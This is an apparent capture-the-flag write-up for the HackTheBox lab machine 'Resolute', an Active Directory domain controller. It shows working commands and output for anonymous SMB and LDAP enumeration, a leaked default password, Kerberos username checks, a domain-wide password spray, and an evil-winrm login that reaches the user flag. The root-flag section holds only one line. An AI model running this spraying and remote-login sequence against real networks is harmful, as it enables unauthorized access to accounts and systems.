# Resolute

# User Flag

## NMAP Enumeration

NMAP Port Scan:

```bash
sudo nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report 10.10.10.169

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49671/tcp open  unknown          syn-ack ttl 127
49678/tcp open  unknown          syn-ack ttl 127
49679/tcp open  unknown          syn-ack ttl 127
49684/tcp open  unknown          syn-ack ttl 127
49907/tcp open  unknown          syn-ack ttl 127
```

NMAP Service Scan:

```bash
nmap -sV -sC -Pn -v -oN nmap-report -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49667,49671,49678,49679,49684,49907 10.10.10.169

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-06-22 11:50:38Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49678/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49679/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49907/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-06-22T11:51:28
|_  start_date: 2024-06-22T11:40:03
|_clock-skew: mean: 2h27m04s, deviation: 4h02m30s, median: 7m03s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2024-06-22T04:51:30-07:00
```

## SMB Enumeration

Identified that null credentials do appear to work:

```bash
enum4linux -A 10.10.10.169 > enum4linux.txt

Server 10.10.10.169 allows sessions using username '', password ''
```

Was able to perform anonymous login but no shares returned:

```bash
# Anonymous login successful but no shares returned
smbclient -L //10.10.10.169 -N
```

Found User Accounts with crackmapexec:

```bash
crackmapexec smb 10.10.10.169 -u '' -p '' --users

SMB         10.10.10.169    445    RESOLUTE         [+] Enumerated domain user(s)
SMB         10.10.10.169    445    RESOLUTE         megabank.local\Administrator                  Built-in account for administering the computer/domain                                                                                                                        
SMB         10.10.10.169    445    RESOLUTE         megabank.local\Guest                          Built-in account for guest access to the computer/domain                                                                                                                      
SMB         10.10.10.169    445    RESOLUTE         megabank.local\krbtgt                         Key Distribution Center Service Account                                                                                                                                       
SMB         10.10.10.169    445    RESOLUTE         megabank.local\DefaultAccount                 A user account managed by the system.
SMB         10.10.10.169    445    RESOLUTE         megabank.local\ryan                           
SMB         10.10.10.169    445    RESOLUTE         megabank.local\marko                          Account created. Password set to Welcome123!                                                                                                                                  
SMB         10.10.10.169    445    RESOLUTE         megabank.local\sunita                         
SMB         10.10.10.169    445    RESOLUTE         megabank.local\abigail                        
SMB         10.10.10.169    445    RESOLUTE         megabank.local\marcus                         
SMB         10.10.10.169    445    RESOLUTE         megabank.local\sally                          
SMB         10.10.10.169    445    RESOLUTE         megabank.local\fred                           
SMB         10.10.10.169    445    RESOLUTE         megabank.local\angela                         
SMB         10.10.10.169    445    RESOLUTE         megabank.local\felicia                        
SMB         10.10.10.169    445    RESOLUTE         megabank.local\gustavo                        
SMB         10.10.10.169    445    RESOLUTE         megabank.local\ulf                            
SMB         10.10.10.169    445    RESOLUTE         megabank.local\stevie                         
SMB         10.10.10.169    445    RESOLUTE         megabank.local\claire                         
SMB         10.10.10.169    445    RESOLUTE         megabank.local\paulo                          
SMB         10.10.10.169    445    RESOLUTE         megabank.local\steve                          
SMB         10.10.10.169    445    RESOLUTE         megabank.local\annette                        
SMB         10.10.10.169    445    RESOLUTE         megabank.local\annika                         
SMB         10.10.10.169    445    RESOLUTE         megabank.local\per                            
SMB         10.10.10.169    445    RESOLUTE         megabank.local\claude                         
SMB         10.10.10.169    445    RESOLUTE         megabank.local\melanie                        
SMB         10.10.10.169    445    RESOLUTE         megabank.local\zach                           
SMB         10.10.10.169    445    RESOLUTE         megabank.local\simon                          
SMB         10.10.10.169    445    RESOLUTE         megabank.local\naoki
```

## LDAP Enumeration

Extract base naming contexts:

```bash
ldapsearch -x -H ldap://10.10.10.169 -s base namingcontexts

# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=megabank,DC=local
namingContexts: CN=Configuration,DC=megabank,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=megabank,DC=local
namingContexts: DC=DomainDnsZones,DC=megabank,DC=local
namingContexts: DC=ForestDnsZones,DC=megabank,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Extract list of users and found user Marko with password set to `Welcome123!`:

```bash
ldapsearch -x -H ldap://10.10.10.169 -D '' -w '' -b "DC=megabank,DC=local" '(objectClass=person)' > ldap-people

cn: Marko Novak
sn: Novak
description: Account created. Password set to Welcome123!
givenName: Marko
distinguishedName: CN=Marko Novak,OU=Employees,OU=MegaBank Users,DC=megabank,D
 C=local
```

## Kerberos

Validated list of names pulled from LDAP:

```bash
sudo ./kerbrute_linux_amd64 userenum --dc 10.10.10.169 -d megabank.local -o kerbrute-user-enum /home/kali/Downloads/HackTheBox/Resolute/userlist

2024/06/22 13:09:19 >  [+] VALID USERNAME:       MS02$@megabank.local
2024/06/22 13:09:19 >  [+] VALID USERNAME:       ryan@megabank.local
2024/06/22 13:09:19 >  [+] VALID USERNAME:       marcus@megabank.local
2024/06/22 13:09:19 >  [+] VALID USERNAME:       sunita@megabank.local
2024/06/22 13:09:19 >  [+] VALID USERNAME:       marko@megabank.local
2024/06/22 13:09:19 >  [+] VALID USERNAME:       RESOLUTE$@megabank.local
2024/06/22 13:09:19 >  [+] VALID USERNAME:       sally@megabank.local
2024/06/22 13:09:19 >  [+] VALID USERNAME:       abigail@megabank.local
2024/06/22 13:09:19 >  [+] VALID USERNAME:       felicia@megabank.local
2024/06/22 13:09:19 >  [+] VALID USERNAME:       angela@megabank.local
2024/06/22 13:09:19 >  [+] VALID USERNAME:       fred@megabank.local
2024/06/22 13:09:19 >  [+] VALID USERNAME:       gustavo@megabank.local
2024/06/22 13:09:19 >  [+] VALID USERNAME:       stevie@megabank.local
2024/06/22 13:09:19 >  [+] VALID USERNAME:       ulf@megabank.local
2024/06/22 13:09:19 >  [+] VALID USERNAME:       claire@megabank.local
2024/06/22 13:09:19 >  [+] VALID USERNAME:       paulo@megabank.local
2024/06/22 13:09:19 >  [+] VALID USERNAME:       steve@megabank.local
2024/06/22 13:09:19 >  [+] VALID USERNAME:       annette@megabank.local
2024/06/22 13:09:19 >  [+] VALID USERNAME:       annika@megabank.local
2024/06/22 13:09:19 >  [+] VALID USERNAME:       per@megabank.local
2024/06/22 13:09:19 >  [+] VALID USERNAME:       claude@megabank.local
2024/06/22 13:09:19 >  [+] VALID USERNAME:       melanie@megabank.local
2024/06/22 13:09:19 >  [+] VALID USERNAME:       zach@megabank.local
2024/06/22 13:09:19 >  [+] VALID USERNAME:       simon@megabank.local
2024/06/22 13:09:19 >  [+] VALID USERNAME:       naoki@megabank.local
```

ASREPRoasting failed to find a user account that has the privilege "Does not require Pre-Authentication" set:

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py megabank.local/ -dc-ip 10.10.10.169 -usersfile userlist -no-pass -request -outputfile kerberos-users-found
```

## SMB Enumeration - Reused Password (Part 2)

Attempted to use credentials `marko:Welcome123!` to further enumerate SMB shares or attempt to run Keberos attack but these failed. Checked if the password could be resused for another user or if there is a user that can have there password reset.

```bash
crackmapexec smb 10.10.10.169 -u userlist -p Welcome123!          
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Guest:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\RESOLUTE$:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\MS02$:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123!                       # <---- Interesting!
```

Looks like `Marko` remebered to change his password but not `melanie`. Checked if `melanie` has WINRM access:

```bash
crackmapexec winrm 10.10.10.169 -u melanie -p 'Welcome123!'                                                          
SMB         10.10.10.169    5985   RESOLUTE         [*] Windows 10 / Server 2016 Build 14393 (name:RESOLUTE) (domain:megabank.local)
HTTP        10.10.10.169    5985   RESOLUTE         [*] http://10.10.10.169:5985/wsman
WINRM       10.10.10.169    5985   RESOLUTE         [+] megabank.local\melanie:Welcome123! (Pwn3d!)
```

Used `evil-winrm` to get the flag:

```bash
evil-winrm -i 10.10.10.169 -u melanie -p Welcome123!


*Evil-WinRM* PS C:\Users\melanie\Desktop> dir


    Directory: C:\Users\melanie\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/22/2024   4:41 AM             34 user.txt

```

# Root Flag

## Windows Privilege Escalation

Uploaded `winPEASx64.exe` but did not observe any details of interest.







